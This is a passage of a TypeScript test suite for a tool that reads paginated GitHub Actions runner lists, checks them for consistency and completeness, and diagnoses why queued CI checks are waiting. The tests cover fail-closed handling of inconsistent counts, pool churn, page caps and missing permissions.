    const list = await readRunnerList(fetchFrom(pages), "list runners", "perm");
    expect(!list.ok && list.reason).toContain("total_count moved from 2 to 3 on page 2");
  });

  it("more distinct runners than total_count is inconsistent, never a pool", async () => {
    const list = await readRunnerList(
      fetchFrom([{ total_count: 1, runners: [runner("a", "offline", WINDOWS, false, 1), runner("b", "online", WINDOWS, false, 2)] }]),
      "list runners",
      "perm",
    );
    expect(!list.ok && list.reason).toContain("2 distinct runners were read against a total_count of 1");
  });

  it("N13: page 1 re-read with a different total_count is an incomplete list", async () => {
    let reads = 0;
    const list = await readRunnerList(
      async (): Promise<unknown> => {
        reads += 1;
        return reads === 1
          ? { total_count: 1, runners: [runner("a", "offline", WINDOWS, false, 1)] }
          : { total_count: 2, runners: [runner("a", "offline", WINDOWS, false, 1), runner("b", "online", WINDOWS, false, 2)] };
      },
      "list runners",
      "perm",
    );
    expect(reads).toBe(2);
    expect(!list.ok && list.reason).toContain("page 1 read again did not answer the same total_count and the same runners");
  });

  it("N13: page 1 re-read with a different first runner is an incomplete list", async () => {
    let reads = 0;
    const list = await readRunnerList(
      async (): Promise<unknown> => {
        reads += 1;
        return { total_count: 1, runners: [runner("a", "offline", WINDOWS, false, reads === 1 ? 1 : 9)] };
      },
      "list runners",
      "perm",
    );
    expect(list.ok).toBe(false);
  });

  it("round-3 R2: a 101-runner pool that churns one runner on page 1 keeps the count and first id -- and is still incomplete", async () => {
    const page1 = Array.from({ length: 100 }, (_, index) => runner(`r${index + 1}`, "offline", WINDOWS, false, index + 1));
    // Between the walk and the re-read, runner 50 is removed and runner 102
    // registered: total_count stays 101 and the first id stays 1.
    const churned = [...page1.slice(0, 49), ...page1.slice(50), runner("r101", "offline", WINDOWS, false, 101)];
    let page1Reads = 0;
    const list = await readRunnerList(
      async (page): Promise<unknown> => {
        if (page === 2) return { total_count: 101, runners: [runner("r101", "offline", WINDOWS, false, 101)] };
        page1Reads += 1;
        return { total_count: 101, runners: page1Reads === 1 ? page1 : churned };
      },
      "list runners",
      "perm",
    );
    expect(page1Reads).toBe(2);
    expect(!list.ok && list.reason).toContain("did not answer the same total_count and the same runners");
  });

  it("N13: a re-read that agrees completes the list; an empty pool agrees with itself", async () => {
    expect(await readRunnerList(async (): Promise<unknown> => ({ total_count: 0, runners: [] }), "list runners", "perm")).toEqual({
      ok: true,
      runners: [],
    });
  });

  it("the online match on page 2 is found -- page 1 alone would have said offline-only", async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(WINDOWS) },
      repoPages: [
        { total_count: 2, runners: [runner("NZ-NNR1", "offline", WINDOWS)] },
        { total_count: 2, runners: [runner("NZ-NNR2", "online", WINDOWS)] },
      ],
    });
    expect(diagnosis?.determination).toBe("online");
  });

  it("an empty page short of total_count is an INCOMPLETE list, never a smaller pool", async () => {
    const list = await readRunnerList(
      fetchFrom([{ total_count: 5, runners: [runner("a", "offline", WINDOWS)] }, { total_count: 5, runners: [] }]),
      "list runners",
      "perm",
    );
    expect(!list.ok && list.reason).toContain("page 2 was empty after 1 of 5 runners");
  });

  it("the page cap reached short of total_count fails closed and says so", async () => {
    let id = 1000;
    const list = await readRunnerList(
      async (): Promise<unknown> => ({ total_count: 1000, runners: [runner("x", "offline", WINDOWS, false, id++)] }),
      "list runners",
      "perm",
      false,
      3,
    );
    expect(!list.ok && list.reason).toContain("stopped at the 3-page cap after 3 of 1000 runners");
  });

  it("an unreadable count, a runner with no id, or a malformed runner fails closed", async () => {
    expect(await readRunnerList(fetchFrom([{ runners: [] }]), "list runners", "perm")).toMatchObject({ ok: false });
    expect(
      await readRunnerList(fetchFrom([{ total_count: 1, runners: [{ name: "a", status: "online", labels: [] }] }]), "list runners", "perm"),
    ).toMatchObject({ ok: false });
    expect(
      await readRunnerList(fetchFrom([{ total_count: 1, runners: [{ id: 1, name: "a", status: "online" }] }]), "list runners", "perm"),
    ).toMatchObject({ ok: false });
  });

  it("a truncated list makes the diagnosis UNDETERMINED -- no stall is claimed from a partial pool", async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(WINDOWS) },
      repoPages: [{ total_count: 2, runners: [runner("NZ-NNR1", "offline", WINDOWS)] }],
    });
    expect(diagnosis).toMatchObject({ determination: "undetermined", infrastructureStall: null });
    expect(diagnosis?.detail).toContain("the list is incomplete");
  });
});

describe("diagnoseWaitingChecks -- checks with no runner to ask about", () => {
  it("a commit status is undetermined: it names no runner labels", async () => {
    const status: StatusContext = {
      kind: "status_context",
      context: "ci/external",
      state: "PENDING",
      startedAt: null,
      completedAt: null,
      targetUrl: "https://ci.example.com/1",
    };
    const { diagnosis, calls } = await one({}, status);
    expect(diagnosis?.detail).toContain("commit status from outside GitHub Actions");
    expect(calls).toEqual([]);
  });

  it("a check run from another app, or from another repository, is undetermined and reads nothing", async () => {
    const { source, calls } = scripted({});
    const out = await diagnoseWaitingChecks(source, REPO, [queued("app", null), queued("fork", 7, "other/nen")], CTX);
    expect(out.map((each) => each.determination)).toEqual(["undetermined", "undetermined"]);
    expect(out[1]?.detail).toContain("its job runs in other/nen");
    expect(calls).toEqual([]);
  });

  it(`reads at most ${MAX_DIAGNOSED_JOBS} jobs and reports the rest as not read`, async () => {
    const entries: RollupEntry[] = Array.from({ length: MAX_DIAGNOSED_JOBS + 2 }, (_, index) => queued(`c${index}`, index + 1));
    const jobs: Record<number, unknown> = {};
    for (let id = 1; id <= MAX_DIAGNOSED_JOBS + 2; id += 1) jobs[id] = job(["ubuntu-latest"], { id });
    const { source, calls } = scripted({ jobs });
    const out = await diagnoseWaitingChecks(source, REPO, entries, CTX);
    expect(out).toHaveLength(MAX_DIAGNOSED_JOBS + 2);
    expect(calls.filter((call) => call.startsWith("job"))).toHaveLength(MAX_DIAGNOSED_JOBS);
    expect(out[MAX_DIAGNOSED_JOBS]?.detail).toContain(`only the first ${MAX_DIAGNOSED_JOBS} waiting checks`);
  });
});

describe("renderRunnerAvailability", () => {
  it("renders nothing when nothing was diagnosed, and a header plus one line per check otherwise", async () => {
    expect(renderRunnerAvailability(undefined)).toEqual([]);
    expect(renderRunnerAvailability([])).toEqual([]);
    const { diagnosis } = await one({
      jobs: { 7: job(WINDOWS) },
      repoError: httpError(403, { "x-accepted-github-permissions": "administration=read" }),
    });
    const lines = renderRunnerAvailability(diagnosis === undefined ? [] : [diagnosis]);
    expect(lines[0]).toContain("a diagnosis only, the verdict is unchanged");
    expect(lines[1]).toMatch(/^ {2}- w \[runs-on: self-hosted, Windows, X64\]: runner diagnosis unavailable without administration=read/);
    expect(lines[2]).toBe("      missing permission: administration=read");
  });
});
